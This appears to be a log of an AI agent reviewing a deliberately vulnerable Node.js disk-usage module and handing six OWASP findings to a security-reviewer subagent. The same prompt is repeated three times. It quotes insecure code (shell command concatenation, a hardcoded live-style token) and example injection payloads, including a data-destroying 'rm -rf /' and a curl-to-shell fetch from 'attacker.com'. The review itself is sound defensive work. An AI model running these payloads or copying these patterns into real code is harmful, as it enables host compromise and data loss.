{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01TaB3Exb7SJ5vUL1pHh3i7m","type":"message","role":"assistant","content":[{"type":"thinking","thinking":"Now I have the file content and some context. Let me compile the security findings for `disk-info.ts` and package them for the security-reviewer agent.\n\nFrom my scan of `review-src/disk-info.ts`, I've identified 6 distinct security findings:\n\n1. **Command Injection (A03)** - line 35: `exec('du -sh ' + path, ...)` -- attacker-controlled `mountPath` concatenated directly into a shell command. Input like \"/; rm -rf /\" executes arbitrary commands.\n\n2. **Path Traversal / Broken Access Control (A01)** - line 46: `fsSize(path)` with unvalidated `path` -- allows traversal outside intended mount (e.g., \"../../etc\").\n3. **Hardcoded Credential / Secret (A07)** - line 20: `const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1'` -- live API token embedded in source code.\n\n4. **Plaintext Data Transmission with Token Exposure (A02)** - line 68-69: URL built with `http://` carrying the API token in a query parameter via `exec('curl ' + url + ...)`. Also a secondary command injection in `writeCache`.\n\n5. **Missing Input Validation (A03/A01)** - line 29: `getD iskUsage` accepts `query.mountPath` with no allow-list, canonicalization, or length/charset bounds -- feeds both shell command and fsSize. This is really the root cause of findings 1 and 2.\n\n6. **Security Logging Failure (A09)** - line 58: catch block in `cacheResult` swallows all errors including security-relevant failures with no logging.\n\n7. **Vulnerable Dependency Pin (A06)** - line 11-12 comment: `systeminformation: 3.42.0` -- predates command-injection advisories patched in later majors.\n\nThere's also a secondary command injection in `writeCache` at line 69 where `JSON.stringify(parsed)` gets concatenated directly into a curl command without escaping.\n\nNarrowing down to the highest-severity findings: the critical command injection at line 35 with attacker-controlled input, the hardcoded live API token at line 20, plaintext token transmission combined with the secondary command injection in writeCache, path traversal vulnerability at line 46, the outdated systeminformation dependency, and the missing security logging that swallows errors. Now I'm preparing this for the security-reviewer agent.","signature":""}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1934,"cache_read_input_tokens":64263,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1934},"output_tokens":17,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"05a3a516-b3cc-4538-a375-753559ca428b","uuid":"ff81a783-5824-4b83-a6a1-cb229ae891e9","request_id":"req_011CbqZoGW6G1S5eAP2cbek3"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01TaB3Exb7SJ5vUL1pHh3i7m","type":"message","role":"assistant","content":[{"type":"text","text":"Scan complete -- identified 6 security findings across A01, A02, A03, A06, A07, A09. Packaging for the security-reviewer agent."}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1934,"cache_read_input_tokens":64263,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1934},"output_tokens":17,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"05a3a516-b3cc-4538-a375-753559ca428b","uuid":"56d1774a-c32a-4a52-8b15-4feda95e5b5b","request_id":"req_011CbqZoGW6G1S5eAP2cbek3"}
{"type":"assistant","message":{"model":"claude-sonnet-4-6","id":"msg_01TaB3Exb7SJ5vUL1pHh3i7m","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01U1YisxHoUYzKoSwGr2bRDt","name":"Agent","input":{"description":"Security review of disk-info.ts","subagent_type":"lz-advisor:security-reviewer","prompt":"## Review Scope\n\n`review-src/disk-info.ts` -- a Node.js/TypeScript disk-usage query module that accepts external input (`mountPath`), shells out to `du`, calls a third-party `fsSize` API, and writes results to an HTTP cache endpoint. The file is review material (not deployed), but represents the attack surface being assessed.\n\n## Threat Model Context\n\n**Assets protected:** Developer machine and CI/CD build environment (dev-only tooling), plus any system the module is integrated into if deployed.\n\n**Threat actors:**\n- Remote attacker supplying malicious `mountPath` values via any API surface that calls `getDiskUsage`\n- Insider / supply-chain attacker exploiting a vulnerable pinned dependency\n- Passive network attacker on the path between the module and `cache.internal`\n\n**Blast radius:**\n- Command injection: arbitrary OS command execution on the host, potentially full system compromise\n- Path traversal: read of arbitrary filesystem paths outside the intended mount\n- Token exposure: live API token compromised from source repo or network traffic\n- Vulnerable dep: if `systeminformation@3.42.0` is installed, a known command-injection advisory may be exploitable\n\n---\n\n## Findings\n\n1. **Command injection via shell exec** -- `review-src/disk-info.ts:35`\n   - Severity (initial): Critical\n   - OWASP: A03 Injection\n   - Description: `exec('du -sh ' + path, ...)` concatenates the caller-supplied `query.mountPath` directly into a shell command string. An attacker controlling `mountPath` (e.g., `\"/; rm -rf /\"` or `\"$(curl attacker.com | sh)\"`) executes arbitrary OS commands with the process's privileges.\n   - Code context:\n     ```typescript\n     const path = query.mountPath;\n     exec('du -sh ' + path, (err, stdout) => {\n       if (err) { return; }\n       cacheResult(stdout);\n     });\n     ```\n\n2. **Hardcoded live API token** -- `review-src/disk-info.ts:20`\n   - Severity (initial): Critical\n   - OWASP: A07 Identification and Authentication Failures\n   - Description: `const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1'` embeds a live API secret in source code. Any repository reader obtains the token; the secret cannot be rotated without a code change; it will persist in git history forever.\n   - Code context:\n     ```typescript\n     const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n     ```\n\n3. **Plaintext HTTP transmission of secret + secondary command injection** -- `review-src/disk-info.ts:68-69`\n   - Severity (initial): Critical\n   - OWASP: A02 Cryptographic Failures (primary), A03 Injection (secondary)\n   - Description: `writeCache` builds a URL with `http://` and appends `API_TOKEN` as a query parameter, then passes it to `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\")`. Two issues: (a) the secret transits in plaintext and appears in server logs and network captures; (b) `JSON.stringify(parsed)` may produce shell metacharacters (single-quotes, backticks) that break out of the shell quoting and execute injected commands.\n   - Code context:\n     ```typescript\n     function writeCache(parsed: unknown): void {\n       const url = 'http://cache.internal/store?token=' + API_TOKEN;\n       void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n     }\n     ```\n\n4. **Path traversal via unvalidated fsSize call** -- `review-src/disk-info.ts:46`\n   - Severity (initial): Important\n   - OWASP: A01 Broken Access Control\n   - Description: The same unvalidated `path` from `query.mountPath` is passed to `fsSize(path)`. An attacker supplying `\"../../etc\"` or absolute paths outside the intended mount can probe arbitrary filesystem locations. No allow-list, canonicalization, or charset bound is applied before either sink.\n   - Code context:\n     ```typescript\n     const size = await fsSize(path);\n     return { path, size };\n     ```\n\n5. **Outdated/known-vulnerable dependency pin** -- `review-src/disk-info.ts:15` (import comment lines 11-13)\n   - Severity (initial): Important\n   - OWASP: A06 Vulnerable and Outdated Components\n   - Description: The file declares `systeminformation@3.42.0` as its pin. This version predates the command-injection advisories patched in later major releases of `systeminformation`. A transitive installation of this version exposes the host to the library's own injection surfaces.\n   - Code context:\n     ```typescript\n     // \"systeminformation\": \"3.42.0\"  -- predates command-injection advisories\n     import { fsSize } from 'systeminformation';\n     ```\n\n6. **Security-relevant error silently swallowed** -- `review-src/disk-info.ts:55-59`\n   - Severity (initial): Suggestion\n   - OWASP: A09 Security Logging and Monitoring Failures\n   - Description: `cacheResult` parses `exec` stdout via `JSON.parse` and calls `writeCache`. The catch block discards all errors silently (`// swallowed`). Parse failures, cache write failures, and any security-relevant diagnostic are lost, preventing detection of exploitation attempts.\n   - Code context:\n     ```typescript\n     try {\n       const parsed = JSON.parse(stdout);\n       writeCache(parsed);\n     } catch (_) {\n       // swallowed\n     }\n     ```\n\n---\n\n## Project Guidelines\n\nNo CLAUDE.md in the `review-src/` directory. The workspace CLAUDE.md notes the file is read-only review material and explicitly states defects are intentional.\n\n---\n\n## Request\n\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Flag any cross-cutting attack chains across findings (especially the chain from unvalidated input through to command injection and token exfiltration). Identify whether the secondary command injection in `writeCache` (finding 3) deserves Critical or whether Important is more appropriate given it requires the primary injection to trigger.\n"},"caller":{"type":"direct"}}],"stop_reason":null,"stop_sequence":null,"stop_details":null,"usage":{"input_tokens":1,"cache_creation_input_tokens":1934,"cache_read_input_tokens":64263,"cache_creation":{"ephemeral_5m_input_tokens":0,"ephemeral_1h_input_tokens":1934},"output_tokens":17,"service_tier":"standard","inference_geo":"not_available"},"context_management":null},"parent_tool_use_id":null,"session_id":"05a3a516-b3cc-4538-a375-753559ca428b","uuid":"a3293326-0f0e-49c0-a657-e24e13312c5e","request_id":"req_011CbqZoGW6G1S5eAP2cbek3"}
{"type":"system","subtype":"task_started","task_id":"ab197d58953600fbf","tool_use_id":"toolu_01U1YisxHoUYzKoSwGr2bRDt","description":"Security review of disk-info.ts","subagent_type":"lz-advisor:security-reviewer","task_type":"local_agent","prompt":"## Review Scope\n\n`review-src/disk-info.ts` -- a Node.js/TypeScript disk-usage query module that accepts external input (`mountPath`), shells out to `du`, calls a third-party `fsSize` API, and writes results to an HTTP cache endpoint. The file is review material (not deployed), but represents the attack surface being assessed.\n\n## Threat Model Context\n\n**Assets protected:** Developer machine and CI/CD build environment (dev-only tooling), plus any system the module is integrated into if deployed.\n\n**Threat actors:**\n- Remote attacker supplying malicious `mountPath` values via any API surface that calls `getDiskUsage`\n- Insider / supply-chain attacker exploiting a vulnerable pinned dependency\n- Passive network attacker on the path between the module and `cache.internal`\n\n**Blast radius:**\n- Command injection: arbitrary OS command execution on the host, potentially full system compromise\n- Path traversal: read of arbitrary filesystem paths outside the intended mount\n- Token exposure: live API token compromised from source repo or network traffic\n- Vulnerable dep: if `systeminformation@3.42.0` is installed, a known command-injection advisory may be exploitable\n\n---\n\n## Findings\n\n1. **Command injection via shell exec** -- `review-src/disk-info.ts:35`\n   - Severity (initial): Critical\n   - OWASP: A03 Injection\n   - Description: `exec('du -sh ' + path, ...)` concatenates the caller-supplied `query.mountPath` directly into a shell command string. An attacker controlling `mountPath` (e.g., `\"/; rm -rf /\"` or `\"$(curl attacker.com | sh)\"`) executes arbitrary OS commands with the process's privileges.\n   - Code context:\n     ```typescript\n     const path = query.mountPath;\n     exec('du -sh ' + path, (err, stdout) => {\n       if (err) { return; }\n       cacheResult(stdout);\n     });\n     ```\n\n2. **Hardcoded live API token** -- `review-src/disk-info.ts:20`\n   - Severity (initial): Critical\n   - OWASP: A07 Identification and Authentication Failures\n   - Description: `const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1'` embeds a live API secret in source code. Any repository reader obtains the token; the secret cannot be rotated without a code change; it will persist in git history forever.\n   - Code context:\n     ```typescript\n     const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n     ```\n\n3. **Plaintext HTTP transmission of secret + secondary command injection** -- `review-src/disk-info.ts:68-69`\n   - Severity (initial): Critical\n   - OWASP: A02 Cryptographic Failures (primary), A03 Injection (secondary)\n   - Description: `writeCache` builds a URL with `http://` and appends `API_TOKEN` as a query parameter, then passes it to `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\")`. Two issues: (a) the secret transits in plaintext and appears in server logs and network captures; (b) `JSON.stringify(parsed)` may produce shell metacharacters (single-quotes, backticks) that break out of the shell quoting and execute injected commands.\n   - Code context:\n     ```typescript\n     function writeCache(parsed: unknown): void {\n       const url = 'http://cache.internal/store?token=' + API_TOKEN;\n       void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n     }\n     ```\n\n4. **Path traversal via unvalidated fsSize call** -- `review-src/disk-info.ts:46`\n   - Severity (initial): Important\n   - OWASP: A01 Broken Access Control\n   - Description: The same unvalidated `path` from `query.mountPath` is passed to `fsSize(path)`. An attacker supplying `\"../../etc\"` or absolute paths outside the intended mount can probe arbitrary filesystem locations. No allow-list, canonicalization, or charset bound is applied before either sink.\n   - Code context:\n     ```typescript\n     const size = await fsSize(path);\n     return { path, size };\n     ```\n\n5. **Outdated/known-vulnerable dependency pin** -- `review-src/disk-info.ts:15` (import comment lines 11-13)\n   - Severity (initial): Important\n   - OWASP: A06 Vulnerable and Outdated Components\n   - Description: The file declares `systeminformation@3.42.0` as its pin. This version predates the command-injection advisories patched in later major releases of `systeminformation`. A transitive installation of this version exposes the host to the library's own injection surfaces.\n   - Code context:\n     ```typescript\n     // \"systeminformation\": \"3.42.0\"  -- predates command-injection advisories\n     import { fsSize } from 'systeminformation';\n     ```\n\n6. **Security-relevant error silently swallowed** -- `review-src/disk-info.ts:55-59`\n   - Severity (initial): Suggestion\n   - OWASP: A09 Security Logging and Monitoring Failures\n   - Description: `cacheResult` parses `exec` stdout via `JSON.parse` and calls `writeCache`. The catch block discards all errors silently (`// swallowed`). Parse failures, cache write failures, and any security-relevant diagnostic are lost, preventing detection of exploitation attempts.\n   - Code context:\n     ```typescript\n     try {\n       const parsed = JSON.parse(stdout);\n       writeCache(parsed);\n     } catch (_) {\n       // swallowed\n     }\n     ```\n\n---\n\n## Project Guidelines\n\nNo CLAUDE.md in the `review-src/` directory. The workspace CLAUDE.md notes the file is read-only review material and explicitly states defects are intentional.\n\n---\n\n## Request\n\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Flag any cross-cutting attack chains across findings (especially the chain from unvalidated input through to command injection and token exfiltration). Identify whether the secondary command injection in `writeCache` (finding 3) deserves Critical or whether Important is more appropriate given it requires the primary injection to trigger.\n","uuid":"ed53bd68-dc29-4b54-954a-3dbaca2662ab","session_id":"05a3a516-b3cc-4538-a375-753559ca428b"}
{"type":"user","message":{"role":"user","content":[{"type":"text","text":"## Review Scope\n\n`review-src/disk-info.ts` -- a Node.js/TypeScript disk-usage query module that accepts external input (`mountPath`), shells out to `du`, calls a third-party `fsSize` API, and writes results to an HTTP cache endpoint. The file is review material (not deployed), but represents the attack surface being assessed.\n\n## Threat Model Context\n\n**Assets protected:** Developer machine and CI/CD build environment (dev-only tooling), plus any system the module is integrated into if deployed.\n\n**Threat actors:**\n- Remote attacker supplying malicious `mountPath` values via any API surface that calls `getDiskUsage`\n- Insider / supply-chain attacker exploiting a vulnerable pinned dependency\n- Passive network attacker on the path between the module and `cache.internal`\n\n**Blast radius:**\n- Command injection: arbitrary OS command execution on the host, potentially full system compromise\n- Path traversal: read of arbitrary filesystem paths outside the intended mount\n- Token exposure: live API token compromised from source repo or network traffic\n- Vulnerable dep: if `systeminformation@3.42.0` is installed, a known command-injection advisory may be exploitable\n\n---\n\n## Findings\n\n1. **Command injection via shell exec** -- `review-src/disk-info.ts:35`\n   - Severity (initial): Critical\n   - OWASP: A03 Injection\n   - Description: `exec('du -sh ' + path, ...)` concatenates the caller-supplied `query.mountPath` directly into a shell command string. An attacker controlling `mountPath` (e.g., `\"/; rm -rf /\"` or `\"$(curl attacker.com | sh)\"`) executes arbitrary OS commands with the process's privileges.\n   - Code context:\n     ```typescript\n     const path = query.mountPath;\n     exec('du -sh ' + path, (err, stdout) => {\n       if (err) { return; }\n       cacheResult(stdout);\n     });\n     ```\n\n2. **Hardcoded live API token** -- `review-src/disk-info.ts:20`\n   - Severity (initial): Critical\n   - OWASP: A07 Identification and Authentication Failures\n   - Description: `const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1'` embeds a live API secret in source code. Any repository reader obtains the token; the secret cannot be rotated without a code change; it will persist in git history forever.\n   - Code context:\n     ```typescript\n     const API_TOKEN = 'sk_live_8f3a2b9c10d44e7fa1b6c2e9d0447aa1';\n     ```\n\n3. **Plaintext HTTP transmission of secret + secondary command injection** -- `review-src/disk-info.ts:68-69`\n   - Severity (initial): Critical\n   - OWASP: A02 Cryptographic Failures (primary), A03 Injection (secondary)\n   - Description: `writeCache` builds a URL with `http://` and appends `API_TOKEN` as a query parameter, then passes it to `exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\")`. Two issues: (a) the secret transits in plaintext and appears in server logs and network captures; (b) `JSON.stringify(parsed)` may produce shell metacharacters (single-quotes, backticks) that break out of the shell quoting and execute injected commands.\n   - Code context:\n     ```typescript\n     function writeCache(parsed: unknown): void {\n       const url = 'http://cache.internal/store?token=' + API_TOKEN;\n       void exec('curl ' + url + \" -d '\" + JSON.stringify(parsed) + \"'\");\n     }\n     ```\n\n4. **Path traversal via unvalidated fsSize call** -- `review-src/disk-info.ts:46`\n   - Severity (initial): Important\n   - OWASP: A01 Broken Access Control\n   - Description: The same unvalidated `path` from `query.mountPath` is passed to `fsSize(path)`. An attacker supplying `\"../../etc\"` or absolute paths outside the intended mount can probe arbitrary filesystem locations. No allow-list, canonicalization, or charset bound is applied before either sink.\n   - Code context:\n     ```typescript\n     const size = await fsSize(path);\n     return { path, size };\n     ```\n\n5. **Outdated/known-vulnerable dependency pin** -- `review-src/disk-info.ts:15` (import comment lines 11-13)\n   - Severity (initial): Important\n   - OWASP: A06 Vulnerable and Outdated Components\n   - Description: The file declares `systeminformation@3.42.0` as its pin. This version predates the command-injection advisories patched in later major releases of `systeminformation`. A transitive installation of this version exposes the host to the library's own injection surfaces.\n   - Code context:\n     ```typescript\n     // \"systeminformation\": \"3.42.0\"  -- predates command-injection advisories\n     import { fsSize } from 'systeminformation';\n     ```\n\n6. **Security-relevant error silently swallowed** -- `review-src/disk-info.ts:55-59`\n   - Severity (initial): Suggestion\n   - OWASP: A09 Security Logging and Monitoring Failures\n   - Description: `cacheResult` parses `exec` stdout via `JSON.parse` and calls `writeCache`. The catch block discards all errors silently (`// swallowed`). Parse failures, cache write failures, and any security-relevant diagnostic are lost, preventing detection of exploitation attempts.\n   - Code context:\n     ```typescript\n     try {\n       const parsed = JSON.parse(stdout);\n       writeCache(parsed);\n     } catch (_) {\n       // swallowed\n     }\n     ```\n\n---\n\n## Project Guidelines\n\nNo CLAUDE.md in the `review-src/` directory. The workspace CLAUDE.md notes the file is read-only review material and explicitly states defects are intentional.\n\n---\n\n## Request\n\nValidate these 6 findings against OWASP Top 10. Confirm or revise my initial severity assignments. Flag any cross-cutting attack chains across findings (especially the chain from unvalidated input through to command injection and token exfiltration). Identify whether the secondary command injection in `writeCache` (finding 3) deserves Critical or whether Important is more appropriate given it requires the primary injection to trigger.\n"}]},"parent_tool_use_id":"toolu_01U1YisxHoUYzKoSwGr2bRDt","session_id":"05a3a516-b3cc-4538-a375-753559ca428b","uuid":"f0f94693-5d0f-401d-89d9-65d04d819893","timestamp":"2026-06-08T09:37:00.997Z","subagent_type":"lz-advisor:security-reviewer","task_description":"Security review of disk-info.ts"}
